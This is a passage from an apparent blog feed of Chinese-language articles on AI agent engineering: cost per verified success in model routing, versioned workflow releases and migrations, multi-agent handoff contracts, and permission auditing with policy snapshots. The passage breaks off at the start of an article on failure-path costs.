    <content><![CDATA[<p>模型网关做成本优化时，最容易比较的是每百万 input&#x2F;output tokens 单价，然后把简单请求路由到便宜模型。真实 Agent 任务里，便宜模型如果更常生成无效工具参数、需要重试、触发 fallback 或人工接管，最终可能比贵模型花得更多。</p>
<p>我关注 <code>Cost per Verified Success</code>：一类任务从用户请求开始，到业务结果被验证成功，整条路径花了多少钱。失败 attempt、工具调用、检索、基础设施、人工和延迟机会成本都进入分子，不只算最后一次模型账单。</p>
<p class="article-diagram-scroll"><img src="/images/articles/model-routing-success-cost.svg" class="lazyload" data-srcset="/images/articles/model-routing-success-cost.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="模型路由优化的是每次验证成功的成本"></p>
<span id="more"></span>

<h2 id="先定义-Verified-Success"><a href="#先定义-Verified-Success" class="headerlink" title="先定义 Verified Success"></a>先定义 Verified Success</h2><p>摘要任务可以用事实覆盖与引用检查，SQL 用 parser&#x2F;catalog&#x2F;plan&#x2F;结果断言，工具任务需要 operation&#x2F;business state verified。HTTP 200 或模型 finish&#x3D;stop 不是统一成功标准。</p>
<p>每个 task type 有 completion contract 和风险权重。无法确定业务结果时标 unknown，不为了报表把它算成功。用户点赞是辅助信号，不能覆盖工具实际失败。</p>
<p>成功标签可能晚到。任务重跑 operation 十分钟后完成，通过 run&#x2F;operation ID 回填；路由训练使用 final label 与 label source，不拿即时“accepted”训练成成功。</p>
<p>同一请求被人工兜底后，用户目标完成，但 automated_success&#x3D;false、assisted_success&#x3D;true。两种都可统计，成本与自动化能力分开。</p>
<h2 id="全路径成本包含失败尝试"><a href="#全路径成本包含失败尝试" class="headerlink" title="全路径成本包含失败尝试"></a>全路径成本包含失败尝试</h2><p>模型成本按每个 attempt 的 provider usage 与 price snapshot 计算。流中途断开没有 usage 时标 estimated；缓存折扣、batch、区域价格也随当时单价版本。</p>
<p>检索&#x2F;embedding&#x2F;rerank、built-in tools、MCP&#x2F;API、浏览器&#x2F;沙箱和存储是直接成本。失败工具也计费；重复 operation 被幂等挡住仍有网关与模型开销。</p>
<p>fallback 把多个 attempt 累加。主模型输出 80% 后断流、备用从头生成，不能只把备用模型记到账单。路由器否则会偏好经常失败但首轮便宜的模型。</p>
<p>人工 review&#x2F;接管可用标准时间成本或实际工时估算。高风险流程本来需要审批，不算模型失败；因参数错而人工修正，属于质量成本。</p>
<p>延迟按业务场景折算或至少单独约束。离线研究多等一分钟可能无妨，交互工具调用 p95 增加十秒会显著影响完成率。不要硬把所有延迟换成虚假货币，但要作为优化约束。</p>
<h2 id="指标按任务桶而不是全站平均"><a href="#指标按任务桶而不是全站平均" class="headerlink" title="指标按任务桶而不是全站平均"></a>指标按任务桶而不是全站平均</h2><p>SQL 生成、简单问答、研究报告、代码修复和生产运维的成功定义、上下文、工具与风险不同。全站 CPS 会被高频简单任务主导。</p>
<p>按 task type、risk、语言、context size、tool required、tenant policy 和 model snapshot 分桶。每桶展示请求量、verified success、unknown、attempts、fallback、token&#x2F;tool&#x2F;human cost、p95 latency。</p>
<p>样本小的桶不直接自动调权。使用置信区间&#x2F;保守先验，先影子与灰度。模型升级、Prompt Bundle 或工具版本变化会使历史分布失效，指标按版本切片。</p>
<p>重要长尾任务设守门质量。成本再低也不能用权限违规或错误生产动作换成功率；先满足安全&#x2F;质量门槛，再优化 CPS。</p>
<h2 id="路由评分要考虑预期全路径"><a href="#路由评分要考虑预期全路径" class="headerlink" title="路由评分要考虑预期全路径"></a>路由评分要考虑预期全路径</h2><p>对候选模型估计：首轮成功概率、失败类型分布、重试&#x2F;fallback 概率、tokens、工具路径和延迟。预期成本不是 <code>price × expected tokens</code>，而是所有路径的加权和。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">E[cost] = first_attempt</span><br><span class="line">        + P(retry) * retry_path</span><br><span class="line">        + P(fallback) * fallback_path</span><br><span class="line">        + P(human) * assisted_path</span><br></pre></td></tr></table></figure>

<p>先按硬能力、数据地域、权限和上下文过滤，再在可用候选中优化 <code>E[cost] / P(verified_success)</code>。当分母太低时，不让低价掩盖不可用。</p>
<p>FrugalGPT 讨论了使用 LLM cascade&#x2F;routing 在质量和成本间优化。企业 Agent 还要把工具与验证纳入 reward&#x2F;cost，否则只优化文本答案，忽略真实执行结果。</p>
<p>探索流量有严格上限。新模型先在低风险桶获取样本，不用生产高风险任务做在线赌博。route decision 记录候选、分数、uncertainty 和 policy version。</p>
<h2 id="失败分类决定是否-Fallback"><a href="#失败分类决定是否-Fallback" class="headerlink" title="失败分类决定是否 Fallback"></a>失败分类决定是否 Fallback</h2><p>Provider 503&#x2F;429、协议 malformed、model invalid output、policy deny、tool state conflict、business validation failed 的处理不同。policy deny 换模型没有意义；tool 已执行后换模型只能重新总结，不能再调用。</p>
<p>Fallback 规则同时检查剩余 deadline、预算、side-effect status 和能力硬约束。每次 attempt 有新 ID，复用已完成 artifacts；不会把已输出给用户的半段与新模型无痕拼接。</p>
<p>连续相同 error&#x2F;no progress 触发停止。一个便宜模型在同一 schema error 上自修复五次，会迅速放大成本。错误有允许 recovery action，而不是让模型无限尝试。</p>
<p>失败成本反向进入模型评分。某 snapshot 在 function calls 经常 invalid，工具桶 CPS 上升，即使普通问答仍便宜，不影响它在其他桶使用。</p>
<h2 id="成本改动必须做因果验证"><a href="#成本改动必须做因果验证" class="headerlink" title="成本改动必须做因果验证"></a>成本改动必须做因果验证</h2><p>降低 CPS 可能来自业务输入变简单、知识缓存命中增加或价格变化，不一定是路由更好。策略实验固定流量分桶和 Bundle，old&#x2F;new 同期随机分配，比较 verified outcomes 与完整成本。</p>
<p>报告展示 numerator&#x2F;denominator 变化。CPS 下降若因为系统把更多困难任务标 unknown&#x2F;拒绝，不是真优化；成功率、coverage、拒答和用户影响一起看。</p>
<p>价格用运行时 snapshot，不用今天单价重算所有历史后声称策略改善。技术模拟可以用统一价格重算，财务实账与模拟视图分开。</p>
<p>线上异常可以从 CPS 下钻到 attempts、raw events、tool operations 和人工接管原因。优化动作针对真实浪费：压上下文、修协议重试、改工具 schema、调整 route，不是简单换最便宜型号。</p>
<p>模型单价是采购参数，任务成功成本才是工程指标。把失败路径和业务验证纳入账本后，路由策略才会奖励真正稳定完成任务的模型，而不是奖励一次调用看起来便宜。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2305.05176">FrugalGPT：LLM cascade 与成本&#x2F;质量优化</a></li>
<li><a href="https://openai.com/index/new-tools-for-building-agents/">OpenAI 2025 Responses API：模型、内置工具与 Agent 构建模块</a></li>
<li><a href="https://github.com/openai/evals">OpenAI Evals：按任务用例验证模型行为</a></li>
<li><a href="https://sre.google/workbook/implementing-slos/">Google SRE Workbook：基于用户可见结果定义 SLI&#x2F;SLO</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>成本治理</tag>
        <tag>模型路由</tag>
        <tag>Agent 评测</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent Workflow 需要像代码一样发布：版本、迁移和回滚缺一不可</title>
    <url>//2025/10/11/agent-workflow-release/</url>
    <content><![CDATA[<p>Agent Workflow 一旦承载长任务、人工确认和真实工具，它就不再是一张可以随手改的流程图。运行中的实例可能停在旧节点，等待一个旧 schema 的工具结果；这时删节点、换工具或调整状态含义，会让恢复逻辑无法解释历史。</p>
<p>我会像发布代码一样发布 Workflow：源码构建成不可变 definition，锁定 Prompt&#x2F;模型&#x2F;工具&#x2F;策略依赖，通过静态检查和回归后灰度。新版本默认只接新 Run，旧实例继续原版本，确需迁移则使用显式 migration plan。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-workflow-release.svg" class="lazyload" data-srcset="/images/articles/agent-workflow-release.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Workflow 的构建与发布链路"></p>
<span id="more"></span>

<h2 id="Definition-包含的不只是节点图"><a href="#Definition-包含的不只是节点图" class="headerlink" title="Definition 包含的不只是节点图"></a>Definition 包含的不只是节点图</h2><p>Workflow version 要固定 nodes、edges、state schema、input&#x2F;output contracts、retry&#x2F;timeout、compensation、completion invariants 和 migration metadata。每个模型节点引用确切 Bundle，每个工具节点引用 registry&#x2F;tool version。</p>
<p>如果只给流程图版本，Prompt alias 或工具 schema 仍用 latest，运行行为会漂移。构建阶段解析所有依赖为 content hashes，生成完整 manifest：workflow、model route、prompts、tool registry、policy、validator、artifact schemas。</p>
<p>Definition 创建后不可原地编辑。<code>prod</code> alias 指向一个已验证 version，回滚是切 alias，不是在线改 JSON。历史 Run 永远能找到当时 definition 与依赖。</p>
<p>环境变量和 secret 只记录引用，不打包秘密。不同环境的 binding 独立版本，测试 Definition 不能因切到生产而自动获得更宽工具权限。</p>
<h2 id="静态检查先挡结构错误"><a href="#静态检查先挡结构错误" class="headerlink" title="静态检查先挡结构错误"></a>静态检查先挡结构错误</h2><p>构建器检查不可达节点、无终态循环、缺失错误边、未绑定 schema、超时&#x2F;重试冲突、无补偿的高风险动作和无法解析的依赖版本。</p>
<p>状态迁移必须覆盖每类结果：model completed&#x2F;truncated&#x2F;incomplete，tool accepted&#x2F;running&#x2F;succeeded&#x2F;failed&#x2F;unknown，approval approved&#x2F;rejected&#x2F;expired。未知结果默认进 error&#x2F;quarantine，不落到 success 分支。</p>
<p>预算也做路径分析。循环无 max steps、并行 fan-out 无上限、节点 timeout 之和超过总 deadline 都应构建失败或告警。静态分析不能证明业务正确，却能防很多结构性事故。</p>
<p>权限声明沿图传播。某节点产出敏感 artifact，后续外部 tool 的 data policy 不允许，就在发布前发现；不等线上模型真的把数据发出去。</p>
<h2 id="Contract-与-Eval-覆盖失败路径"><a href="#Contract-与-Eval-覆盖失败路径" class="headerlink" title="Contract 与 Eval 覆盖失败路径"></a>Contract 与 Eval 覆盖失败路径</h2><p>每条 edge 都有 fixture。工具 timeout 但 operation 已成功、审批在到达前过期、模型 function arguments 被截断、worker 重启、并行分支部分失败，都要跑状态与幂等断言。</p>
<p>能力评测检查任务结果，守门评测检查权限、重复副作用、错误终态和数据出域。新 Definition 必须在当前 hash 的数据集上通过，不能复用旧报告。</p>
<p>测试固定 virtual clock、tool fixtures、knowledge&#x2F;index 和 policy snapshot。模型行为重复多次，断言状态&#x2F;工具&#x2F;证据而非逐字输出。端到端 sandbox 再验证真实集成。</p>
<p>Definition diff 自动生成影响：新增&#x2F;删除节点、改变 schema、重试、工具风险、状态、迁移。评审者看到行为变化，不必从大 JSON 中自己找。</p>
<h2 id="灰度只让新-Run-进入"><a href="#灰度只让新-Run-进入" class="headerlink" title="灰度只让新 Run 进入"></a>灰度只让新 Run 进入</h2><p>canary 按 user&#x2F;workspace hash 固定分流，新 Run 从入口选择 workflow version 并保持到结束。不能同一个 Run 前半段 v11、服务发布后后半段 v12。</p>
<p>比较 completion、validation、tool errors、human correction、steps、latency、cost 和高风险守门。长任务结果晚到，灰度窗口必须覆盖完整生命周期；只看启动后十分钟会漏掉失败终态。</p>
<p>发现退化切 alias 回 v11，立即阻止新 Run 使用 v12。已经启动的 v12 Run 按 incident policy 继续、暂停或迁移，不能简单回滚代码后任其使用缺失依赖。</p>
<p>工具&#x2F;策略紧急安全禁用可覆盖所有版本。Definition 固定不代表无视当前 deny；执行前仍检查 current revocation&#x2F;policy，trace 同时记录设计版本和实时安全决策。</p>
<h2 id="运行中实例迁移必须显式"><a href="#运行中实例迁移必须显式" class="headerlink" title="运行中实例迁移必须显式"></a>运行中实例迁移必须显式</h2><p>多数情况让旧 Run 跑完最安全。需要迁移通常因为安全修复、旧依赖下线或长等待超过兼容窗口。Migration 声明 source versions、eligible states、state transform、artifact mapping、tool operation handling 和 rollback。</p>
<p>只迁移稳定 checkpoint，不在 MODEL_RUNNING&#x2F;TOOL_RUNNING 中间换定义。先对账外部 operation，冻结 lease，再转换 state。旧节点 <code>WAIT_APPROVAL_V1</code> 到新 <code>WAIT_APPROVAL_V2</code> 若 plan schema 变化，旧批准应失效并重新确认。</p>
<p>Migration 本身是 operation，有 dry-run、影响实例列表、批次、审计和结果。转换失败的实例留在旧 version&#x2F;quarantine，不形成半迁移状态。</p>
<p>迁移后保留原 event log，新增 <code>migrated_from/to</code> 与 transform version。回放可以按旧 Definition 重建迁移前状态，再验证转换。</p>
<h2 id="兼容窗口由依赖共同决定"><a href="#兼容窗口由依赖共同决定" class="headerlink" title="兼容窗口由依赖共同决定"></a>兼容窗口由依赖共同决定</h2><p>旧 Workflow 能继续运行，前提是工具、Prompt artifacts、policy evaluator、schemas 和存储仍兼容。发布新工具时保留旧 version；删除字段前查未完成 Runs 与 Bundles 的使用图。</p>
<p>Artifact schema 使用 versioned reader。新 runtime 能读旧事件，不要求把历史数据库原地改写。无法兼容时提供离线 migration，并验证 hash&#x2F;count。</p>
<p>模型 snapshot 下线是外部约束。预先为旧 Definition 配置经评测的 compatible fallback&#x2F;migration，不在调用失败时随便换通用别名。切换模型属于行为变更，必须留事件。</p>
<p>每个依赖声明 support-until，平台能提前发现某批长 Run 会跨过窗口。等下线当天再处理，会逼出高风险紧急迁移。</p>
<h2 id="发布证据与运行证据闭环"><a href="#发布证据与运行证据闭环" class="headerlink" title="发布证据与运行证据闭环"></a>发布证据与运行证据闭环</h2><p>Release record 包含 source commit、definition&#x2F;manifest hashes、tests&#x2F;evals、approvals、canary metrics、alias change 与 rollback target。Run trace 引用 release ID。</p>
<p>线上失败回流到对应 workflow&#x2F;node&#x2F;edge 评测，而不是只改 Prompt。状态转换 bug、工具 contract drift、迁移错误都有独立 owner。</p>
<p>Workflow 像代码发布，不是为了增加流程，而是承认它已经决定生产系统如何行动。不可变版本、失败路径回归、灰度与实例迁移建好后，团队才能持续改 Agent，又不破坏正在运行的工作。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://semver.org/spec/v2.0.0.html">Semantic Versioning 2.0.0：版本与兼容性约定</a></li>
<li><a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Objects：内容寻址的不可变构建产物</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：跨节点记录 Span、Event 与 Link</a></li>
<li><a href="https://www.anthropic.com/research/building-effective-agents">Anthropic Building effective agents：Workflow 与 Agent 的组合模式</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>发布治理</tag>
        <tag>Agent Workflow</tag>
        <tag>版本迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>多 Agent 协作先定义交接协议：任务、证据和所有权不能靠聊天转述</title>
    <url>//2025/11/04/multi-agent-handoff-contract/</url>
    <content><![CDATA[<p>多 Agent Demo 里，主 Agent 常给子 Agent 发一句“去查一下这个问题”，子 Agent 回一段文字，主 Agent 再综合。任务一复杂，就会出现范围重叠、工具权限过宽、结果无法验收、两个 worker 重复做同一副作用，最后也不知道谁还持有任务。</p>
<p>我把交接设计成协议，不是聊天。Orchestrator 创建 Handoff Manifest，worker 获取带期限的 lease，过程产物写共享 Artifact Store，返回结构化 Result Contract；Orchestrator 通过 Acceptance Gate 后才把子任务标完成。</p>
<p class="article-diagram-scroll"><img src="/images/articles/multi-agent-handoff-contract.svg" class="lazyload" data-srcset="/images/articles/multi-agent-handoff-contract.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="多 Agent 交接是一份有所有权的契约"></p>
<span id="more"></span>

<h2 id="Handoff-Manifest-先把任务说完整"><a href="#Handoff-Manifest-先把任务说完整" class="headerlink" title="Handoff Manifest 先把任务说完整"></a>Handoff Manifest 先把任务说完整</h2><p>Manifest 包含 task ID、parent&#x2F;run、objective、scope、input artifact refs、allowed tools&#x2F;resources、subject&#x2F;delegation、budget、deadline、priority、expected output schema 和 completion criteria。</p>
<p>Objective 要能验收。“研究 MCP”太宽，“比较 2024-11-05 规范中 resources 与 tools 的控制模型，返回条款链接和差异表”才有边界。</p>
<p>输入通过不可变 artifact refs 传递，不把主 Agent 全部对话复制给 worker。worker 只看到子任务需要的用户约束、证据和工具，减少噪声与权限面。</p>
<p>完成标准由 orchestrator&#x2F;流程定义，不能让 worker 自己说“我认为完成”。例如必须覆盖三个 claims、每条至少一个官方来源、不得执行写工具、输出符合 schema。</p>
<h2 id="Lease-解决谁当前负责"><a href="#Lease-解决谁当前负责" class="headerlink" title="Lease 解决谁当前负责"></a>Lease 解决谁当前负责</h2><p>worker 接单后获取 lease，记录 owner agent instance、attempt、acquired&#x2F;heartbeat&#x2F;expiry。同一 task 同时只有一个有效 lease，避免两个 worker 并发写同一 artifact 或调用同一工具。</p>
<p>心跳失联不立即重派。先检查 worker&#x2F;external operations，确认没有正在执行副作用；只读&#x2F;纯计算任务可在 lease expiry 后新 attempt，写操作使用 operation idempotency&#x2F;status 对账。</p>
<p>worker 主动释放、完成或被取消都有事件。Orchestrator 重启后从 lease store 恢复，不靠对话中“某某正在处理”判断。</p>
<p>长工具 operation 与 worker lease 分开。worker 可以退出，operation 仍由工具系统运行；新 worker 接管时查询同一 operation，不重新执行。</p>
<h2 id="共享的是-Artifact，不是隐式记忆"><a href="#共享的是-Artifact，不是隐式记忆" class="headerlink" title="共享的是 Artifact，不是隐式记忆"></a>共享的是 Artifact，不是隐式记忆</h2><p>worker 输出检索结果、代码 diff、计划、测试报告等不可变 artifacts，带 type&#x2F;schema&#x2F;version&#x2F;hash&#x2F;provenance。共享 board 只保存引用和状态，不让多个 Agent 共同修改一段自由文本 memory。</p>
<p>Artifact owner 表示谁产生，不表示只有它能用；ACL 与 data classification 随 artifact 传播。子 Agent 不能把高敏感输入交给无 scope 的另一个 worker。</p>
<p>中间发现可发布为 partial artifact，但 status 标 incomplete，列 unresolved。其他任务依赖时明确允许 partial，不能看到文件存在就当完成。</p>
<p>冲突 artifacts 都保留。两个 worker 对同一 claim 给出不同证据，由 acceptance&#x2F;merge policy 比较来源，不让最后写入者覆盖。</p>
<h2 id="Result-Contract-返回状态与缺口"><a href="#Result-Contract-返回状态与缺口" class="headerlink" title="Result Contract 返回状态与缺口"></a>Result Contract 返回状态与缺口</h2><p>结果包括 status（completed&#x2F;partial&#x2F;failed&#x2F;cancelled）、output artifact refs、evidence refs、decisions、tool operations、unresolved questions、warnings、cost&#x2F;usage 和 suggested next actions。</p>
<p>错误使用稳定 category：input_missing、permission_denied、tool_failure、evidence_insufficient、deadline_exceeded。自然语言 message 只是解释，orchestrator 根据 code 与 policy 处理。</p>
<p>worker 不返回自己的秘密或可复用 credential。delegated capability 在 lease 结束失效；result 只包含 capability&#x2F;decision IDs。</p>
<p>下一步建议仍是 proposal。worker 建议“重跑任务”不会自动变成主 Agent 动作，需新 Handoff 或工具授权。</p>
<h2 id="Acceptance-Gate-保留最终责任"><a href="#Acceptance-Gate-保留最终责任" class="headerlink" title="Acceptance Gate 保留最终责任"></a>Acceptance Gate 保留最终责任</h2><p>Orchestrator 检查 result schema、completion criteria、artifact hashes、evidence coverage、operation status 和 budget。验证通过才 accept；缺证据可创建 follow-up，格式错有限修复，越权立即失败。</p>
<p>聚合多个 worker 时按 task IDs 和 claims 对齐，去重同源证据，显示冲突。不是把所有文本串起来再让大模型“总结一下”。</p>
<p>Orchestrator 仍对最终结果负责。它选择如何拆分、把哪些 artifacts 交给谁、接受哪个结果；trace 记录这些 decision。worker 责任限定在 manifest scope。</p>
<p>人工审批也作为 gate，绑定聚合 plan hash。worker 数量增加不会稀释用户确认和 policy。</p>
<h2 id="并行只用于独立子任务"><a href="#并行只用于独立子任务" class="headerlink" title="并行只用于独立子任务"></a>并行只用于独立子任务</h2><p>拆分前画数据&#x2F;状态依赖。两个 worker 需要修改同一文件、使用同一外部锁或后者依赖前者证据时，不应盲目并行。可以先并行调查，再串行合并&#x2F;执行。</p>
<p>共享资源配额由 orchestrator 控制，全局并发、token、工具和外部 API rate limits 不能让每个 worker 各自认为有完整预算。</p>
<p>取消传播到 leases 和模型调用，外部 operation 按能力取消&#x2F;对账。父 Run deadline 到期，不留下孤儿 worker 继续烧成本。</p>
<p>重复任务检测基于 normalized objective、scope 和 input hashes；相似不等于相同，涉及副作用时宁可显式合并，不自动 dedupe。</p>
<h2 id="Trace-要能还原交接链"><a href="#Trace-要能还原交接链" class="headerlink" title="Trace 要能还原交接链"></a>Trace 要能还原交接链</h2><p>父&#x2F;子 tasks 用 OpenTelemetry Links&#x2F;业务 parent IDs 关联，记录 manifest version、lease events、worker Bundle、tools、artifacts、result 与 acceptance decision。</p>
<p>指标按交接阶段：queue&#x2F;lease wait、worker execution、acceptance&#x2F;rework、重复 tasks、orphan leases、artifact conflict、cost per accepted subtask。只看最终 Run 成功率看不出协作开销。</p>
<p>真实失败转成 handoff 回归：输入缺关键约束、lease 超时重派、worker 工具已执行、两个结果冲突、partial 被误 accept、权限 scope 跨 worker 泄露。</p>
<p>Anthropic 的 orchestrator-workers 模式说明了动态拆分价值。生产多 Agent 的难点不在模型数量，而在任务与状态能否可靠交接。Manifest、lease、artifact 和 acceptance 建好后，协作才是可观测系统，不是多个聊天机器人互相转述。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://www.anthropic.com/research/building-effective-agents">Anthropic Building effective agents：Orchestrator-Workers 与并行模式</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：Span Links 与跨工作单元关联</a></li>
<li><a href="https://www.w3.org/TR/prov-o/">W3C PROV-O：Entity、Activity、Agent 与 provenance</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：Handoff 与 Result 的结构契约</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Multi-Agent</tag>
        <tag>Handoff</tag>
        <tag>协作协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 权限审计为什么要还原当时策略：只看今天的角色没有意义</title>
    <url>//2025/12/13/agent-permission-policy-snapshot/</url>
    <content><![CDATA[<p>一次 Agent 删除了错误的数据分区。事故复盘时，审计平台拿当前角色去查，结论是“没有删除权限”。这并不能证明当时的请求被拦截，也不能说明是谁授权的：角色、组织关系、策略和资源标签可能都已变化。</p>
<p>权限审计要回答的是历史问题：在那一刻，哪个主体代表谁，以什么目的，对哪个版本的资源发起了什么动作，策略根据哪些事实作出允许或拒绝。只存用户名和 HTTP 200，根本还原不了这条链。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-permission-policy-snapshot.svg" class="lazyload" data-srcset="/images/articles/agent-permission-policy-snapshot.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 权限决定与策略快照"></p>
<span id="more"></span>

<h2 id="一次调用至少有三类身份"><a href="#一次调用至少有三类身份" class="headerlink" title="一次调用至少有三类身份"></a>一次调用至少有三类身份</h2><p>企业 Agent 很少只有一个“用户”。首先是发起任务的人或服务主体，其次是代表用户运行的 Agent&#x2F;应用，最后是实际调用工具的 Worker 或 MCP Server。它们形成委托链，但权限不能简单求并集。</p>
<p>我会在 Run 中保存 <code>actor</code>、<code>agent_client</code>、<code>workload_identity</code> 与 tenant，同时保存 delegation&#x2F;consent 的范围和期限。业务系统最终授权时既校验用户权限，也校验调用应用可执行的动作。用户能删表，不代表任意接入的 Agent 都能替他删表。</p>
<p>共享服务账户最容易破坏审计。所有请求在下游都显示 <code>agent-prod</code>，上层传来的用户 ID 只是可伪造 header，业务系统无法确认委托。更稳妥的做法是签名的身份上下文、短期 token、明确 audience，并由服务端重新做对象级授权。</p>
<p>MCP 或工具代理不能把收到的 token 原样透传给任意下游。token 应绑定目标资源服务；代理调用上游 API 时使用面向该 API 的独立凭证，并保留原主体与委托关系。否则一个合法 token 会跨越原本的信任边界。</p>
<h2 id="Authorization-Decision-是审计主记录"><a href="#Authorization-Decision-是审计主记录" class="headerlink" title="Authorization Decision 是审计主记录"></a>Authorization Decision 是审计主记录</h2><p>每个敏感 Operation 在执行前生成 <code>decision_id</code>，记录 subject、tenant、resource type&#x2F;id&#x2F;version、action、参数摘要、环境属性、policy&#x2F;model version、decision、reason codes、obligations 与决策时间。工具执行事件引用该 decision。</p>
<p>只记角色名不够。RBAC 角色可能改成员，ABAC 依赖部门、数据等级、环境、时间和资源标签，ReBAC 依赖当时的关系图。审计记录应保存输入事实的规范化摘要，并能从不可变版本重放；涉及隐私的大字段可存 hash 与受控快照引用。</p>
<p>授权模型使用不可变 ID 很实用。每次修改生成新版本，决策明确引用 <code>authorization_model_id</code>；策略包、数据字典和资源标签也同理。当前策略用于新请求，历史审计用当时版本，二者不能混查。</p>
<p><code>allow</code> 不是唯一输出。策略还可以要求二次审批、字段脱敏、行数上限、只生成预览、不允许导出、只能在沙箱执行。这些 obligations 必须进入工具参数和结果校验；只在前端显示一句警告不算执行约束。</p>
<h2 id="权限应落到对象、动作和参数"><a href="#权限应落到对象、动作和参数" class="headerlink" title="权限应落到对象、动作和参数"></a>权限应落到对象、动作和参数</h2><p>“可使用数据库工具”太粗。一个工具可能包含列元数据查询、SELECT、DDL、导出和任务提交。权限至少分到 tool action，并结合目标对象。读取公开指标与查询客户明细的风险不在一个级别。</p>
<p>参数还会改变风险。SQL 工具的库表、查询类型、结果行数和导出目标；消息工具的收件人、群范围和是否外部联系人；任务工具的环境、业务日期与并发，都应参与决策。不能仅凭工具名在调用前放行，然后让模型自由填任何参数。</p>
<p>对象解析必须先于审批。用户说“昨天的订单任务”，Agent 先解析成稳定资源 ID、环境和版本，再展示给人。审批记录绑定这组规范化对象与参数 hash；模型后来换了 SQL 或资源，必须重新决策。</p>
<p>批量操作不要把一万个对象藏在一个模糊 <code>scope=all</code>。可用 manifest 固化对象集合和摘要，策略限制数量、分区范围与总影响，执行结果逐对象关联。这样既能防越界，也能知道部分成功后该补偿什么。</p>
<h2 id="Snapshot-不是复制整套权限数据库"><a href="#Snapshot-不是复制整套权限数据库" class="headerlink" title="Snapshot 不是复制整套权限数据库"></a>Snapshot 不是复制整套权限数据库</h2><p>完整复制身份、关系和策略成本高，也会扩大敏感数据暴露。我更倾向保存“可验证决策包”：不可变策略版本、决策输入事实、外部关系读取版本、最终 reason，以及能证明原记录未被篡改的 hash&#x2F;签名。</p>
<p>如果授权引擎支持历史读取，保存 tuple&#x2F;relation revision；不支持时，对高风险决策保存最小事实快照。低风险只读可保留版本和摘要，高风险写操作保留更完整的证据。保留周期按合规和事故追溯要求分级。</p>
<p>时钟也要可信。Agent、权限服务与工具的时间偏差会造成“先执行、后授权”的假象。事件使用服务端接收时间和单调序号，跨系统通过 trace&#x2F;operation&#x2F;decision IDs 关联；必要时记录签名日志的批次根。</p>
<p>策略日志本身要防滥用。管理员能查审计不意味着能看所有原始参数；访问审计日志也要授权、留痕和脱敏。否则为追责建立的数据集合，反而成为新的敏感信息出口。</p>
<h2 id="权限变化时，长任务必须重新判断"><a href="#权限变化时，长任务必须重新判断" class="headerlink" title="权限变化时，长任务必须重新判断"></a>权限变化时，长任务必须重新判断</h2><p>Run 创建时固定权限快照，不代表可以执行几天。长期研究任务可以用创建时权限决定允许读取的初始输入，但每次产生外部副作用前要检查当前主体状态、资源版本和撤销信号。</p>
<p>这需要同时保留两份证据：任务开始时的 policy context，以及 Operation 执行前的 fresh decision。用户离职、角色撤销、资源升密或审批过期后，旧 Run 不得继续沿用缓存的 allow。</p>
<p>缓存授权决定必须把 subject、resource、action、parameter class、policy version 和关系 revision 都纳入 key，并设置短 TTL&#x2F;撤销机制。缓存命中也写 decision reference，不能让审计链断在本地内存。</p>
<p>我会做三类回归：同一历史输入在旧策略版本上重放，结果必须一致；新策略对基准权限矩阵不能意外扩权；从 Agent trace 随机抽一个工具操作，必须能一路查到主体、对象、策略、审批和实际结果。</p>
<p>权限系统的价值不是事故后给出一个“当前不允许”。它应在执行前守住边界，并在执行后留下足以复现当时判断的证据。Agent 越能调用真实系统，这条历史授权链越不能省。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://openfga.dev/docs/getting-started/cli">OpenFGA：Authorization Model 的不可变版本</a></li>
<li><a href="https://www.openpolicyagent.org/docs/management-decision-logs">Open Policy Agent：Policy Decision Logs</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization">MCP Authorization：资源绑定与 token audience</a></li>
<li><a href="https://research.google/pubs/zanzibar-googles-consistent-global-authorization-system/">Google Zanzibar：面向全球规模的一致授权系统</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>最小权限</tag>
        <tag>权限审计</tag>
        <tag>策略快照</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 成本为什么要算失败路径：断流、循环和重复工具都在花钱</title>
    <url>//2025/11/15/agent-cost-failure-path/</url>
    <content><![CDATA[<p>Agent 成本报表如果只统计成功回答的 token，很容易得出错误结论。一次最终成功的 Run，前面可能有两次断流、三次无效工具参数、一次重复浏览器操作和人工接管。用户只看到一个结果，平台已经为失败路径付了多份成本。</p>
<p>我会按 <code>run -&gt; step -&gt; attempt/operation</code> 建成本账本，每笔费用关联 outcome 与 failure category。不是为了给失败“罚款”，而是找到哪些协议、上下文、工具和循环在持续制造浪费。</p>
